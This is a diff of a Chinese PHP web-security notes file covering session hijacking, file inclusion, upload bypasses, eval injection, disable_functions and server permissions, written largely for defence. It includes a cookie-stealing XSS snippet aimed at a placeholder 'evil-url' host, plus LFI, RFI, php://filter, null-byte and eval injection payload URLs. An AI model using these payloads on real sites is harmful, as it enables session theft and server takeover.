@@ -19777,22 +19347,29 @@ PHP内部Session的实现机制虽然不是很安全，但是关于生成Session
 最基本的Cookie窃取方式：XSS漏洞。
 
 一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的JS脚本获取Cookie，进而通过异步请求把存有Session ID的Cookie上报给攻击者。
-
+```
 var img = document.createElement('img');
 img.src = 'http://evil-url?c=' +encodeURIComponent(document.cookie);
 document.getElementsByTagName('body')[0].appendChild(img);
+```
 如何寻找XSS漏洞是另外一个话题了，这里不详细讨论。防御上可以设置Cookie的HttpOnly属性，一旦一个Cookie被设置为HttpOnly，JS脚本就无法再获取到，而网络传输时依然会带上，也就是说依然可以依靠这个Cookie进行Session维持，但客户端JS对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。但是上面说的是无法利用XSS进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。
 
 下面介绍一种XSS结合其他漏洞的攻击方式。
+
 利用PHP开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括Cookie信息。
 
 如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后Parse出Cookie信息，然后上传给攻击者。phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。防御上是关闭所有phpinfo类dump request信息的页面。
 
 防御方法：
+
 更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。
+
 关闭透明化SessionID。透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。
+
 设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。
+
 关闭所有phpinfo类dump request信息的页面。
+
 使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。
 
 加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。
@@ -19802,11 +19379,15 @@ document.getElementsByTagName('body')[0].appendChild(img);
 会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。
 
 攻击步骤：
+
 攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；
+
 目标用户携带攻击者设定的Session ID登录站点；
+
 攻击者通过Session ID获得合法会话。
 
 攻击者重置SessionID的方式：
+
 重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击。
 
 使用Cookie来存放SessionID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。1、使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。
@@ -19818,100 +19399,70 @@ document.getElementsByTagName('body')[0].appendChild(img);
 这里还有一点需要注意，攻击者如果持有的是有效的SessionID，那么防御措施就一定得校验验证。如攻击者可以先到目标站点登录，获得有效的Session ID，然后再拿这个Session ID去重置目标用户的会话标识，那么这时候用户将会在不知情的情况下访问攻击者设定的合法会话（实际上登录的是攻击者的账号了）中，从而攻击者将有可能获取到目标用户的敏感信息。
 
 防御方法：
+
 用户登录时生成新的SessionID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。
+
 大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。
-```
 
 ### 目录权限安全
-```
+
 https://www.cnblogs.com/ghjbk/p/6757749.html
-1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini
 
+1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini
+```
 [HOST=域名]
 open_basedir=限制目录:/tmp:/proc
-
+```
 这种方式更简便.
 
 1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini
-
+```
 [HOST=域名]
 open_basedir=限制目录:/tmp:/proc
-
+```
 这种方式更简便.
+
 https://segmentfault.com/a/1190000018373387
-```
+
 ### 包含本地与远程文件
-```
+
 https://blog.51cto.com/tdcqvip/1958654
+
 文件包含漏洞介绍：
 
-
-
-  程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
-
-
-
-
+程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
 
 漏洞成因：
 
-
-
-  文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包 含漏洞。
-
-
-
-
+文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包 含漏洞。
 
 漏洞危害：
 
-
-
-    执行恶意代码、包含恶意文件控制网站、甚至控制网站服务器等。
-
-
+执行恶意代码、包含恶意文件控制网站、甚至控制网站服务器等。
 
 本地包含漏洞：
 
-
-
 代码：
-
+```
 <?PHP
-
 $file=@$_GET['name'];
-
 if($file){
 	include $file;
 }
-
 ?>
-    
 
 以以上这个代码为例：
 
-
-
 访问：http://127.0.0.1/fileupload/include.php?name=1.txt
 
-
-
 txt文件代码为：
-
 <?php
-
 phpinfo();
-
 ?>
-
-
+```
 我们可以看到txt文件里的内容以php文件的方式执行了；如下图所示：
 
 wKiom1mdGyWDvKAjAAB9cHenV-0609.png
-
-
-
-
 
 再看，如果访问：http://127.0.0.1/fileupload/include.php?name=2.jpg
 
@@ -19919,36 +19470,24 @@ wKiom1mdGyWDvKAjAAB9cHenV-0609.png
 
 wKioL1mdHS6hluOdAAASw4-kQdQ070.png-wh_50
 
-
-
 用菜刀可以直接连接，也就是说不管后缀是什么样，最后都会以php的形式执行。
-
-
 
 但是有时候会这样，这个在ISCC国赛中遇到了，就是在最后会自动加入.php,非常烦人。
 
-
-
 代码2：
-
+```
 <?php
     Include  $_GET['page'].".php"
 ?>
-
+```
 
 执行结果如下图：
 
 wKioL1mdJBmBc5u6AABo5WvNZ28269.png-wh_50
 
-
-
 如果访问：http://127.0.0.1/fileupload/include2.php?page=1.txt
 
-
-
 还是报错。
-
-
 
 wKiom1mdJYCDlsCEAABQC659A7c814.png-wh_50
 
@@ -19956,41 +19495,17 @@ wKiom1mdJYCDlsCEAABQC659A7c814.png-wh_50
 
 利用环境：php版本<5.3magic_quotes_gpc取消的（magic_quotes_gpc = off）
 
-
-
-
-
 访问：http://127.0.0.1/fileupload/include2.php?page=1.txt%00
-
-
 
 wKioL1mdJcXzg_hBAAB0G2GPapw630.png
 
-
-
-
-
 远程包含：
 
-
-
-  远程的文件名不能为php可解析的扩展名(php、php5..)，而且php.ini中allow_url_fopen和allow_url_include为On才可以。
-
-
-
-
+远程的文件名不能为php可解析的扩展名(php、php5..)，而且php.ini中allow_url_fopen和allow_url_include为On才可以。
 
 访问：http://127.0.0.1/fileupload/include.php?name=http://127.0.0.1/1.txt
 
-
-
 wKioL1mdJtnjcJOkAACPnjdVwdM034.png-wh_50
-
-
-
-
-
-
 
 如果是遇到这种情况：
 
@@ -19998,35 +19513,21 @@ wKiom1mdJz-R4oI_AABJe51vBaA471.png可以用“？”或者“%00”阶段；
 
 http://127.0.0.1/fileupload/include2.php?page=http://127.0.0.1/1.txt?
 
-
-
-
-
 读取源码：php://filter/read=convert.base64-encode/resource=1.txt
 
-
-
 http://127.0.0.1/fileupload/include.php?name=php://filter/read=convert.base64-encode/resource=1.txt
-
-
 
 读取出来的是base64编码的，进行解码就行了。
 
 wKiom1mdKCvBXXhkAAAezxXZmDI531.png-wh_50
 
-
-
 php://input的用法
 
 php://input
-1.png
-
-
 
 伪协议绕过大小写：
-
+```
 <?php
-    
     if(isset($_GET['f'])){
         if(strpos($_GET['f'],"php") !== False){
             die("error...");
@@ -20037,24 +19538,24 @@ php://input
     }
     
 ?>
+```
 http://127.0.0.1//index.php?f=pHP://filter/read=convert.base64-encode/resource=index
 
-
-
 readfile读取文件，不可以getshell
-
+```
 <?php
 	
 	 @readfile($_GET["file"]);
 ?>
+```
 总结：这些在iscc的国赛赛中出现过，如果当时会阶段或者会读取源码，也就能获奖了，学无止境，加油吧。
 
-```
-
 ### 文件上传 PHP 脚本
-```
+
 https://www.php.cn/php-weizijiaocheng-342688.html
+
 漏洞细节:
+
 这个漏洞存在于php中一个非常常用的函数中：move_uploaded_files，开发者总是用这个函数来移动 上传 的文件,这个函数会检查被上传的文件是否是一个合法的文件(是否是通过 HTTP 的 post 机制上传的)，如果是合法的文件，则将它一定到指定目录中。
 
 例子：
@@ -20064,7 +19565,7 @@ move_uploaded_file ( string $filename , string $destination )这里的问题是�
 我这里用DVWA来演示这个例子，DVWA级别最高的一题中因为种种原因不是很容易通过，意在告诉开发者如何去开发更 安全 的文件上传组件。让我们来看看这个例子：
 
 代码片段：
-
+```
 $uploaded_name = $_FILES['uploaded']['name'];
 $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); $uploaded_size = $_FILES['uploaded']['size'];
 if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){ if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
@@ -20075,43 +19576,40 @@ else {
 $html .= $target_path . ' succesfully uploaded!';
 .
 .
-
+```
 这段代码有好多个漏洞，比如XSCH, XSS等，但是没有RCE这种严重的漏洞，因为从PHP 5.3.1开始，空字符的问题已经被修复了。这里的问题是，DVWA将用户上传的name参数传递给了move_upload_file()函数，那么 php 执行的操作可能就是这样子的：
-
+```
 move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php。
-
+```
 这样，就绕过了代码中对后缀名的校验，并且事实证明GD库中又很多其他函数也存在这个问题(比如getimagesize(), imagecreatefromjpeg()…等)，可以看这个例子。
 
 如果你机器的php版本在 5.4.39, 5.5.x – 5.5.23, 或者 5.6.x – 5.6.7，可以通过检查文件名中是否有\x00字符来解决本文中所述的问题。
 
 安全建议如果你的机器上存在这个漏洞，建议使用随机字符串重命名文件名，而不是使用用户上传上来的name参数的值。
 
-```
 ### `eval` 函数执行脚本
-```
 https://www.jb51.net/hack/122114.html
+
 前段时间一个程序出的问题。就和这差不多。
 
-
-
 复制代码代码如下:
-
+```
 <?php
 $code="${${eval($_GET[c])}}";
 ?>
+```
 对于上面的代码。如果在URL提交http://www.phpeval.cn/test.php?c=phpinfo(); 就可以发现phpinfo()被执行了。而相应的提交c=echo 11111; 发现1111也被输出了。这个代码被执行了。
 
 (好些PHP的代码在写文件的时候。都没有注意到这一点。他们在代码中写php的文件的时候。把代码加在双引号之内。然后过滤掉双引号。认为这样就不能执行了。实际上是可以的。)
 还有一些利用方式，比如：
 
-
-
 复制代码代码如下:
-
+```
 <?php
 $code=addslashes($_GET[c]);
 eval(""$code"");
 ?>
+```
 提交 http://www.site.cn/test.php?c=${${phpinfo()}}; phpinfo()就被执行。如果提交
 http://www.site.cn/test.php?c=${${eval($_GET[d])}};&d=phpinfo();
 
@@ -20120,131 +19618,169 @@ http://www.site.cn/test.php?c=${${eval($_GET[d])}};&d=phpinfo();
 解决方法：
 
 eval函数减弱了你的应用的安全性,因为它给被求值的文本赋予了太多的权力。强烈建议不要使用eval函数。
-```
+
 ### `disable_functions` 关闭高危函数
-```
 https://www.jb51.net/article/29750.htm
+
 phpinfo()
+
 功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。
+
 危险等级：中
 
 passthru()
+
 功能描述：允许执行一个外部程序并回显输出，类似于 exec()。
+
 危险等级：高
 
 exec()
+
 功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。
+
 危险等级：高
 
 system()
+
 功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。
+
 危险等级：高
 
 chroot()
-功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式
-PHP 时才能工作，且该函数不适用于 Windows 系统。
+
+功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作，且该函数不适用于 Windows 系统。
+
 危险等级：高
 
 scandir()
+
 功能描述：列出指定路径中的文件和目录。
+
 危险等级：中
 
 chgrp()
+
 功能描述：改变文件或目录所属的用户组。
+
 危险等级：高
 
 chown()
+
 功能描述：改变文件或目录的所有者。
+
 危险等级：高
 
 shell_exec()
+
 功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。
+
 危险等级：高
 
 proc_open()
+
 功能描述：执行一个命令并打开文件指针用于读取以及写入。
+
 危险等级：高
 
 proc_get_status()
+
 功能描述：获取使用 proc_open() 所打开进程的信息。
+
 危险等级：高
 
 error_log()
-功能描述：将错误信息发送到指定位置（文件）。
-安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，
-执行任意命令。
+
+功能描述：将错误信息发送到指定位置（文件）。 安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令。
+
 危险等级：低
 
 ini_alter()
+
 功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。
+
 具体参见 ini_set()。
+
 危险等级：高
 
 ini_set()
+
 功能描述：可用于修改、设置 PHP 环境配置参数。
+
 危险等级：高
 
 ini_restore()
+
 功能描述：可用于恢复 PHP 环境配置参数到其初始值。
+
 危险等级：高
 
 dl()
+
 功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。
+
 危险等级：高
 
 pfsockopen()
+
 功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。
+
 危险等级：高
 
 syslog()
+
 功能描述：可调用 UNIX 系统的系统层 syslog() 函数。
+
 危险等级：中
 
 readlink()
+
 功能描述：返回符号连接指向的目标文件内容。
+
 危险等级：中
 
 symlink()
+
 功能描述：在 UNIX 系统中建立一个符号链接。
+
 危险等级：高
 
 popen()
+
 功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
+
 危险等级：高
 
 stream_socket_server()
+
 功能描述：建立一个 Internet 或 UNIX 服务器连接。
+
 危险等级：中
 
 putenv()
-功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数
-修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。
+
+功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。
+
 危险等级：高
 
 禁用方法如下：
+
 打开/etc/php.ini文件，
+
 查找到 disable_functions ，添加需禁用的函数名，如下：
+
 phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
-```
 
 ### FPM 独立用户与组，给每个目录特定权限
-```
-https://blog.csdn.net/asdfzxc123789/article/details/101782479
-核心总结：php-fpm/apache 进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。
 
- 
+https://blog.csdn.net/asdfzxc123789/article/details/101782479
+
+核心总结：php-fpm/apache 进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。
 
 根据生产环境不断反馈，发现不断有 php网站被挂木马，绝大部分原因是因为权限设置不合理造成。因为服务器软件，或是 php 程序中存在漏洞都是难免的，在这种情况下，如果能正确设置 Linux 网站目录权限， php 进程权限，那么网站的安全性实际上是可以得到保障的。
 
- 
-
 那么，造成网站被挂木马的原因是什么？
 
- 
-
 1. 　ftp 连接信息被破解，对这个原因，可行的办法就是使用非常复杂的FTP 用户名（不要使用常用的用户名），如果是固定作业，可考虑使用 iptables 防火墙限制来源 IP 。但是一些情景下，可能需要使用 VPN 以便远程维护。　即网站维护者需要使用 FTP 修改网站文件时，必须先登录到 IDC 机房的 VPN 服务器上，再进行后续的操作。
-
- 
 
 2. 　网站服务器软件/ 配置 /php 程序存在漏洞，被利用 
 在讨论这个问题前，先说明文件及进程权限的几个概念:
@@ -20253,80 +19789,49 @@ A.  FTP用户对网站目录具有最大修改权限，那么网站的文件所�
 
 B.  php-fpm/apache/nginx 进程对网站文件至少需要有读取权限，例如，以下命令即可查看这两个进程所使用的账号：
 
-
-
-
-
-
-
 通过上图，我们可以发现，nginx 和 php-fpm 子进程账号是 nobody 。
-
- 
 
 我们再查看网站文件目录的权限： 
 
-
 发现网站文件所有者是www 账号，那说明：
 
-|  nginx和 php 对网站只有读取权限，无写入权限
+nginx和 php 对网站只有读取权限，无写入权限
 
-l  如果php 程序需要对网站某些文件有写入权限，需要手工将文件或目录权限修改为 777
+如果php 程序需要对网站某些文件有写入权限，需要手工将文件或目录权限修改为 777
 
-l  因为php-fpm 子进程是以 nobody 运行，那么 php-fpm 生成的新文件所有者也是 nobody,  这时 ftp 用户将无法修改这些文件，解铃还需系铃人，当 php 生成文件后，需要调用 chmod("/somedir/somefile", 0777) 将文件权限修改为 777 ，以便 FTP 用户也可以修改这个文件。
+因为php-fpm 子进程是以 nobody 运行，那么 php-fpm 生成的新文件所有者也是 nobody,  这时 ftp 用户将无法修改这些文件，解铃还需系铃人，当 php 生成文件后，需要调用 chmod("/somedir/somefile", 0777) 将文件权限修改为 777 ，以便 FTP 用户也可以修改这个文件。
 
-l  经常有开发人员找我请求重设php 生成的文件的权限。
+经常有开发人员找我请求重设php 生成的文件的权限。
 
- 
-
-l  如果php-fpm/apache/nginx进程以网站文件所有者用户运行，那意味着 php-fpm/apache/nginx 进程对整个网站目录具有可写权限，噩梦也就由此开始。
-
- 
+如果php-fpm/apache/nginx进程以网站文件所有者用户运行，那意味着 php-fpm/apache/nginx 进程对整个网站目录具有可写权限，噩梦也就由此开始。
 
 但是我们发现，有不少系统管理员为了省事，违背了Linux 最小化权限的原则，设置 php-fpm/apache/nginx进程以网站文件所有者账号运行，当然这样可能会方便 php 开发人员（ php-fpm 进程对整个网站目录具有可写权限），但是这样一来， Linux 体系的文件系统权限原则将被打破，所有的安全措施将形同虚设。可以想象的是，万一 php 程序中有漏洞，攻击者上传木马，便可以修改网站的所有文件，网站首页被黑，也就不足为怪了。
 
- 
-
 退一步，如果我们设置了较严格的权限，就算php 程序中存在漏洞，那么攻击者也只能篡改权限为 777 的目录，其它的文件是无法被改写的，网站不就就得更安全了吗？
-
- 
 
 核心总结：php-fpm/apache/nginx进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。
 
- 
-
 经过我参阅网上关于nginx, php-fpm 配置的文章教程和市面上的一些书籍，发现有不少人受这些文章的误导，直接让 php-fpm/apache/nginx进程以网站所有者账号运行，例如张宴的《实战 nginx  取代 apache 的高性能 Web服务器》一书的 52 页中，存在以下设置：
-
+```
 <value name="user">www</value>
 
 <value name="group">www</value>
-
- 
-
+```
 而在第50 页，设置网站文件所有者也为 www 用户：
 
 chown -R www:www /data0/htdocs/blog
 
 显然，此书的这部分内部，对初学者有误导，针对这个问题，我已经向本书作者发邮件，希望其能在第二版中进行强调声明，以免由于过度宽松的权限配置，造成一些安全隐患。
 
- 
-
 官方提供的配置文件中，php-fpm 子进程使用 nobody 用户，这完全是合理的，无须修改。
-
- 
 
 那么nginx 的子进程用户，如何设置合理？　我的建议是也使用 nobody （对错误日志写入等无影响），设置方法如下：
 
 nginx.conf文件第一行设置为 user    nobody; ,  再执行 nginx -s reload 即可。
 
- 
-
 php-fpm子进程用户设置方法：
 
 编辑文件php-fpm.conf （一般位于 /usr/local/php/etc/php-fpm.conf,  视安装参数为准），找到 user 、group 两个参数的定义，将其设置为nobody( 默认已经是 nobody) ，再重启 php-fpm 进程即可。
-
- 
-
- 
 
 网站可写目录的特殊注意
 
@@ -20342,185 +19847,123 @@ php-fpm子进程用户设置方法：
 
 4. 　日志目录，　一般都会拒绝用户直接访问之。
 
- 
-
 也就是说对网站开发人员而言，需要对可写目录实现动静分离，不同性能的文件，应该区别对待之，这样也就方便系统管理员，设置合理的nginx 规则，以提高安全性。
 
- 
-
 简单地去掉php 文件的执行权限，并不能阻止 php-fpm 进程解析之。
-
- 
 
 接下来，根据以上总结，系统管理员如何配置nginx 的目录规则，才更安全呢？
 
 1. 　数据缓存目录 /cache/ 
 这个目录的特点是需要777 权限，无须提供给用户访问，那么可以按以下参考配置 nginx 
-
+```
 location ~ "^/cache" {
-
 return 403;
-
 }
-
- 
 
 location ~ "\.php$" {
-
 fastcgi_pass 127.0.0.0:9000;
-
 ....................
-
 }
-
+```
  
-
 这时，任何用户将无法访问/cache/ 目录内容，即使
 
 2.　附件上传目录  attachments
 
 此目录的特点是需要开放访问权限，但所有文件不能由php 引擎解析（包括后缀名改为 gif 的木马文件）
-
+```
 location ~ "^/attachments" {
-
- 
-
 }
-
- 
 
 location ~ "\.php$" {
-
 fastcgi_pass 127.0.0.0:9000;
-
 ....................
-
 }
-
- 
-
+```
 注意，上面对attachments 目录的 location 定义中是没有任何语句的。 nginx 对正则表达式的location 匹配优先级最高，任何一个用正则表达式定义的 location,  只要匹配一次，将不会再匹配其它正则表达式定义的 location 。
-
- 
 
 现在，请在attachments 目录下建立一个 php 脚本文件，再通过浏览器访问安，我们发现浏览器提示下载，这说明 nginx 把 attachments 目录下的文件当成静态文件处理，并没有交给 php fastcgi 处理。这样即使可写目录被植入木马，但因为其无法被执行，网站也就更安全了。
 
- 
-
 显然，重要的php 配置文件，请勿放在此类目录下。
 
- 
-
 3. 　静态文件生成目录 public 
+
 这些目录一般都是php 生成的静态页的保存目录，显然与附件目录有类似之处，按附件目录的权限设置即可。 
 
 可以预见的是，如果我们设置了较严格的权限，即使网站php 程序存在漏洞，木马脚本也只能被写入到权限为 777 的目录中去，如果配合上述严格的目录权限控制，木马也无法被触发运行，整个系统的安全性显然会有显著的提高。
 
- 
-
 但是网站可写目录的作用及权限，只有开发人员最为清楚。这方面需要php 开发人员和系统管理员积极沟通。我们使用的方式是：项目上线前，开发人员根据以文档形式提供网站可写目录的作用及权限，由系统管理员针对不同目录进行权限设置。任何一方修改了网站目录权限，但未体现到文档中，我们认为是违反工作流程的。
+
 https://www.cnblogs.com/hanyouchun/p/5159889.html
-```
 
 ### 了解 Hash 与 Encrypt 区别
-```
 https://www.cnblogs.com/ghjbk/p/7418406.html
+
 1、哈希（Hash）与加密（Encrypt）的区别
-      在本文开始，我需要首先从直观层面阐述哈希（Hash）和加密（Encrypt）的区别，因为我见过很多朋友对这两个概念不是很清晰，容易混淆两者。而正确区别两者是正确选择和使用哈希与加密的基础。
 
-      概括来说，哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。
+在本文开始，我需要首先从直观层面阐述哈希（Hash）和加密（Encrypt）的区别，因为我见过很多朋友对这两个概念不是很清晰，容易混淆两者。而正确区别两者是正确选择和使用哈希与加密的基础。
 
-      具体来说，两者有如下重要区别：
+概括来说，哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。
 
-      1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。
+具体来说，两者有如下重要区别：
 
-      例如，设我们有两段文本：“Microsoft”和“Google”。两者使用某种哈希算法得到的结果分别为：“140864078AECA1C7C35B4BEB33C53C34”和“8B36E9207C24C76E6719268E49201D94”，而使用某种加密算法的到的结果分别为“Njdsptpgu”和“Hpphmf”。可以看到，哈希的结果具有相同的长度，而加密的结果则长度不同。实际上，如果使用相同的哈希算法，不论你的输入有多么长，得到的结果长度是一个常数，而加密算法往往与明文的长度成正比。
+1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。
 
-      2、哈希算法是不可逆的，而加密算法是可逆的。
+例如，设我们有两段文本：“Microsoft”和“Google”。两者使用某种哈希算法得到的结果分别为：“140864078AECA1C7C35B4BEB33C53C34”和“8B36E9207C24C76E6719268E49201D94”，而使用某种加密算法的到的结果分别为“Njdsptpgu”和“Hpphmf”。可以看到，哈希的结果具有相同的长度，而加密的结果则长度不同。实际上，如果使用相同的哈希算法，不论你的输入有多么长，得到的结果长度是一个常数，而加密算法往往与明文的长度成正比。
 
-      这里的不可逆有两层含义，一是“给定一个哈希结果R，没有方法将E转换成原目标文本S”，二是“给定哈希结果R，即使知道一段文本S的哈希结果为R，也不能断言当初的目标文本就是S”。其实稍微想想就知道，哈希是不可能可逆的，因为如果可逆，那么哈希就是世界上最强悍的压缩方式了——能将任意大小的文件压缩成固定大小。
+2、哈希算法是不可逆的，而加密算法是可逆的。
 
-      加密则不同，给定加密后的密文R，存在一种方法可以将R确定的转换为加密前的明文S。
+这里的不可逆有两层含义，一是“给定一个哈希结果R，没有方法将E转换成原目标文本S”，二是“给定哈希结果R，即使知道一段文本S的哈希结果为R，也不能断言当初的目标文本就是S”。其实稍微想想就知道，哈希是不可能可逆的，因为如果可逆，那么哈希就是世界上最强悍的压缩方式了——能将任意大小的文件压缩成固定大小。
 
-      这里先从直观层面简单介绍两者的区别，等下文从数学角度对两者做严谨描述后，读者朋友就知道为什么会有这两个区别了。
+加密则不同，给定加密后的密文R，存在一种方法可以将R确定的转换为加密前的明文S。
+
+这里先从直观层面简单介绍两者的区别，等下文从数学角度对两者做严谨描述后，读者朋友就知道为什么会有这两个区别了。
 
 2、哈希（Hash）与加密（Encrypt）的数学基础
-      从数学角度讲，哈希和加密都是一个映射。下面正式定义两者：
 
-      一个哈希算法是一个多对一映射，给定目标文本S，H可以将其唯一映射为R，并且对于所有S，R具有相同的长度。由于是多对一映射，所以H不存在逆映射
+从数学角度讲，哈希和加密都是一个映射。下面正式定义两者：
+
+一个哈希算法是一个多对一映射，给定目标文本S，H可以将其唯一映射为R，并且对于所有S，R具有相同的长度。由于是多对一映射，所以H不存在逆映射
 
 使得R转换为唯一的S。
 
-      一个加密算法是一个一一映射，其中第二个参数叫做加密密钥，E可以将给定的明文S结合加密密钥Ke唯一映射为密文R，并且存在另一个一一映射，可以结合Kd将密文R唯一映射为对应明文S，其中Kd叫做解密密钥。
+一个加密算法是一个一一映射，其中第二个参数叫做加密密钥，E可以将给定的明文S结合加密密钥Ke唯一映射为密文R，并且存在另一个一一映射，可以结合Kd将密文R唯一映射为对应明文S，其中Kd叫做解密密钥。
 
-      下图是哈希和加密过程的图示：
+下图是哈希和加密过程的图示：
 
+有了以上定义，就很清楚为什么会存在上文提到的两个区别了。由于哈希算法的定义域是一个无限集合，而值域是一个有限集合，将无限集合映射到有限集合，根据“鸽笼原理(Pigeonhole principle)”，每个哈希结果都存在无数个可能的目标文本，因此哈希不是一一映射，是不可逆的。
 
+而加密算法是一一映射，因此理论上来说是可逆的。
 
